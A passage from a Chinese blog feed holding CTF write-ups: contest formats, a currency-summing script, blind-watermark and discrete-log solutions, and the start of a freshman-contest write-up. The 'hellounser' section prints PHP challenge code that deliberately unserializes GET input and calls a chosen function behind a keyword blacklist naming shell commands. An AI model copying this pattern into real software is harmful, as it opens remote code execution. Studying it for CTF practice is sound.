举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。</p><h2 id="KoH-抢占山头"><a href="#KoH-抢占山头" class="headerlink" title="KoH 抢占山头"></a>KoH 抢占山头</h2><p><strong>King of Hill</strong>是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。</p><h2 id="Mix-混合"><a href="#Mix-混合" class="headerlink" title="Mix  混合"></a>Mix  混合</h2><p>​    混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浙江工业大学秋季挑战赛wp</title>
      <link href="/2021/10/03/DASCTF%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2021/10/03/DASCTF%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="浙江工业大学秋季挑战赛wp"><a href="#浙江工业大学秋季挑战赛wp" class="headerlink" title="浙江工业大学秋季挑战赛wp"></a>浙江工业大学秋季挑战赛wp</h1><p>[TOC]</p><p>这个比赛当天一共有三个比赛要打，这个我们就随便参与一下，做了<code>科技节</code>的比赛，还有NISP。下午正好还是我们学校的汇演，就一共拿出来了一个小时做这东西。最后就出了一道杂项，现在倒是有时间看看，顺手整合下网络上有点wp</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Girlfriend’s-account"><a href="#Girlfriend’s-account" class="headerlink" title="Girlfriend’s account"></a>Girlfriend’s account</h3><p>jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？ 我自己的做法是用WPS的大写数字转数字的功能，用哪个做出来了这道题目。在比赛后复盘看了一些大佬的WP，其中白嫖来一个脚本。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> xlrddata<span class="token operator">=</span>xlrd<span class="token punctuation">.</span>open_workbook<span class="token punctuation">(</span><span class="token string">"D:\webtest\information.xls"</span><span class="token punctuation">)</span>table <span class="token operator">=</span> data<span class="token punctuation">.</span>sheets<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>nrows <span class="token operator">=</span> table<span class="token punctuation">.</span>nrowsprice<span class="token operator">=</span>table<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start_rowx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> end_rowx<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span>number<span class="token operator">=</span>table<span class="token punctuation">.</span>col_values<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> start_rowx<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> end_rowx<span class="token operator">=</span><span class="token number">5001</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">num_change</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'零'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'壹'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'贰'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'叁'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'肆'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'陆'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'伍'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'柒'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'捌'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> num<span class="token operator">==</span><span class="token string">'玖'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token keyword">def</span> <span class="token function">aoligeiganle</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    chinese_num <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">&#125;</span>    chinese_amount <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'分'</span><span class="token punctuation">:</span> <span class="token number">0.01</span><span class="token punctuation">,</span> <span class="token string">'角'</span><span class="token punctuation">:</span> <span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token string">'元'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'拾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'佰'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'仟'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token string">'圆'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>    amount_float <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'亿'</span> <span class="token keyword">in</span> amount<span class="token punctuation">:</span>        yi <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'(.+)亿.*'</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        amount_yi <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> yi<span class="token punctuation">:</span>                amount_yi <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>yi<span class="token punctuation">[</span>yi<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> yi<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            amount_yi <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>yi<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        amount_float <span class="token operator">+=</span> amount_yi <span class="token operator">*</span> <span class="token number">100000000</span>        amount <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'.+亿'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'万'</span> <span class="token keyword">in</span> amount<span class="token punctuation">:</span>        wan <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'(.+)万.*'</span><span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        amount_wan <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token keyword">in</span> wan<span class="token punctuation">:</span>                amount_wan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>wan<span class="token punctuation">[</span>wan<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">if</span> wan<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            amount_wan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>wan<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        amount_float <span class="token operator">+=</span> amount_wan <span class="token operator">*</span> <span class="token number">10000</span>        amount <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'.+万'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> amount<span class="token punctuation">,</span> count<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    amount_yuan <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> chinese_amount<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> amount<span class="token punctuation">:</span>            <span class="token keyword">if</span> amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> chinese_num<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                amount_yuan <span class="token operator">+=</span> chinese_num<span class="token punctuation">[</span>amount<span class="token punctuation">[</span>amount<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> chinese_amount<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    amount_float <span class="token operator">+=</span> amount_yuan    <span class="token keyword">return</span> amount_float<span class="token builtin">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">sum</span><span class="token operator">+=</span>aoligeiganle<span class="token punctuation">(</span>price<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>num_change<span class="token punctuation">(</span>number<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面能是我在另一位大佬哪里找到的exalt的公式…..</p><pre class="line-numbers language-none"><code class="language-none">&#x3D;SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;)&#x3D;IF(B3&#x3D;”壹”,1,IF(B3&#x3D;”贰”,2,IF(B3&#x3D;”叁”,3,IF(B3&#x3D;”肆”,4,IF(B3&#x3D;”伍”,5,IF(B3&#x3D;”陆”,6,IF(B3&#x3D;”柒”,7,IF(B3&#x3D;”捌”,8,IF(B3&#x3D;”玖”,9)))))))))  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="双目失明-身残志坚"><a href="#双目失明-身残志坚" class="headerlink" title="双目失明,身残志坚"></a>双目失明,身残志坚</h3><p>看到这个题目还以为是什么神奇的东西，原来是桥本大辉那一脚</p><p>两张图片，同时明显是多了东西，这样应该是图片盲水印，这也符合失明这一点。</p><blockquote><p>Tip  ：<a href="https://github.com/chishaxie/BlindWaterMark">盲水印脚本：</a>与<a href="http://www.manongjc.com/detail/19-creiiewvkgwfziy.html">相关文档</a>，盲水印的题目考察次数倒是蛮多的，还得找题目练一下。</p></blockquote><p>python3命令</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">D:\个人CTFTools\隐写\图像隐写\BlindWaterMark-master&gt;python bwmforpy3.py decode original.png blind.png flag.png -oldseedimage&lt;original.png&gt; + image(encoded)&lt;blind.png&gt; -&gt; watermark&lt;flag.png&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后那张图片是又是盲文，果然是双目失明，身残志坚，这出题人有水平啊。对照<a href="https://blog.csdn.net/weixin_30785593/article/details/96365878">盲文对照表</a>可以发现这个flag实际上就是浙江工业大学的拼音…..</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><p>菜狗不会，看大佬的吧</p><p>三道re:</p><ul><li><a href="https://www.cnblogs.com/holittech/articles/15335668.html">https://www.cnblogs.com/holittech/articles/15335668.html</a></li><li><a href="https://www.cnblogs.com/holittech/articles/15335673.html">https://www.cnblogs.com/holittech/articles/15335673.html</a></li><li><a href="https://www.cnblogs.com/holittech/articles/15335676.html">https://www.cnblogs.com/holittech/articles/15335676.html</a></li></ul><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>菜狗不会，看大佬的吧</p><ul><li><a href="https://www.cnblogs.com/LynneHuan/p/15335597.html">https://www.cnblogs.com/LynneHuan/p/15335597.html</a></li></ul><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到———-网鼎杯-2020-青龙组-（原题）"><a href="#签到———-网鼎杯-2020-青龙组-（原题）" class="headerlink" title="签到———[网鼎杯 2020 青龙组]（原题）"></a>签到———[网鼎杯 2020 青龙组]（原题）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> randomflag<span class="token operator">=</span><span class="token string">b'flag&#123;******************&#125;'</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>flaglong<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>m <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> flaglong<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'c = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># m = 73964803637492582853353338913523546944627084372081477892312545091623069227301</span><span class="token comment"># c = 21572244511100216966799370397791432119463715616349800194229377843045443048821</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实乍一看你会发现他和RSA加密很像，最后的加密过程为c = pow(m, bytes_to_long(flag), n)</p><p>RSA加密就是明文为m，取公钥e和n，密文c=pow(m,e,n)</p><p>这边的一个明显区别为，可以理解为flag明文作为RSA加密里面的公钥e进行的求解。</p><p>这个在密码学里面是基于离散对数的一种加密，我们在求解明文的时候，也就相当于是求解基于同余运算和原根的一种对数运算。</p><p>求解这种问题的话我们用python的sympy模块的discrete_log函数进行求解就可以了。discrete_log(n,c,m)</p><p><strong>解题脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>n <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">256</span>m <span class="token operator">=</span> <span class="token number">73964803637492582853353338913523546944627084372081477892312545091623069227301</span>c <span class="token operator">=</span> <span class="token number">21572244511100216966799370397791432119463715616349800194229377843045443048821</span>flag<span class="token operator">=</span>sympy<span class="token punctuation">.</span>discrete_log<span class="token punctuation">(</span>n<span class="token punctuation">,</span>c<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hellounser"><a href="#hellounser" class="headerlink" title="hellounser"></a>hellounser</h3><p>题目先放在这里，解题我还没弄出来先放一个<a href="https://www.cnblogs.com/aninock/p/15336101.html">题解</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No!No!No!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>             <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>            <span class="token comment">//There is no code to print flag in flag.php</span>            <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"Nice Job!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QFNU_CTF迎新赛题解</title>
      <link href="/2021/09/20/QFNU%20CTF%20%E8%BF%8E%E6%96%B0%E8%B5%9B%E8%A7%A3%E9%A2%98/"/>
      <url>/2021/09/20/QFNU%20CTF%20%E8%BF%8E%E6%96%B0%E8%B5%9B%E8%A7%A3%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="QFNU-CTF迎新赛题解"><a href="#QFNU-CTF迎新赛题解" class="headerlink" title="QFNU_CTF迎新赛题解"></a>QFNU_CTF迎新赛题解</h2><hr><p>这一套题目实际上是为新生准备的，我和对内另一位师哥在迎新的几天才知道这个题目的存在，也是正好我们没什么事情，就做了一下，这里将赛题的wp整理一下，同时考虑到纳新还在解题，不能给出完全的答案。</p><p>[TOC]</p><h2 id="（一）Misc"><a href="#（一）Misc" class="headerlink" title="（一）Misc"></a>（一）Misc</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.  签到"></a>1.  签到</h3><p>​        这道题提供了半张二维码，考虑是否有图像隐写，如修改图像高度。推荐使用工具winhex，png头下面一行的前四位16进制数为宽，后四位为高。</p><p>这里附带常见的文件头</p><pre class="line-numbers language-none"><code class="language-none">File                                ExtensionsHeader4 JPEG                                0xFFD8FFPNG                                 0x89504E470D0A1A0Agif                                 GIF8TIFF                                0x49492A00TIFF                                0x4D4D002A9Bit                                 BMAOL ART                             0x4A47040E0000003AOL ART                             0x4A47030E000000&amp;PC                                  0x0A0501080emf                                 0x0100000058000000#cdr                                 CDRdwg                                 0x41433130psd                                 8BPS3rtf                                 rtf6 XML                                 xml                              html;htm;php;php3;php4;phtml;shtml  type&amp; Email                               Delivery-date:dbx                                 0xCFAD12FEdoc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db    0xD0CF11E0A1B11AE1mdb;mda;mde;mdt                     Standardwpd                                 0xFF575043qdf                                 0xAC9EBD8Fqbb                                 0x4586000006004sly.or.srt.or.slt;sly;srt;slt       0x53520100lwp                          0x576F726450726Fzip;jar                             0x504B03041zip                                 0x504B3030rar                                 Rar!gz;tgz                              0x1F8B085 bz2                                 BZharj                                 0x60EA7z                                                                              7z集&#39;&amp; mpg;mpeg                            0x000001BA# mpg;mpeg                            0x000001B3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个在后期我们会发的个人CTF工具包里就有，不需要都记住，但是zip，rar，png等几个少数常用的，还是希望能够看见就清楚是哪个。</p><h3 id="2-捉猫猫"><a href="#2-捉猫猫" class="headerlink" title="2.  捉猫猫"></a>2.  捉猫猫</h3><p>这道题完全可以通过玩游戏得到，实际上应该是个简单的逆向，但是我是玩出来的(玩出来的内容并不完整，另一部分在哪呢？)所以有兴趣的可以去用逆向试一试</p><h3 id="3-relax"><a href="#3-relax" class="headerlink" title="3. relax"></a>3. relax</h3><p>这一道题是最经典的音频隐写题目，只需要使用<code>audacity-win-2-1-2.exe</code>工具，和一点脑洞。</p><h3 